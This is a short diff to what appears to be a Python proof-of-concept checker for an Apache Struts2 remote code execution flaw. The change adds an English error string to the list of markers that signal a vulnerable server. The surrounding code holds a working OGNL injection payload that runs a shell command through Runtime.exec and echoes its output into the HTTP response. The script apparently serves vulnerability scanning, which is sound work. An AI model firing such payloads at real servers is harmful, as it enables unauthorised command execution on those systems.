@@ -11,7 +11,8 @@ def poc(url):
     ran_a = random.randint(10000000, 20000000)
     ran_b = random.randint(1000000, 2000000)
     ran_check = ran_a - ran_b
-    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop']
+    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop',
+             'Unable to initialize device PRN']
     lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
     poc_goop = [
         r'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('print goop').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
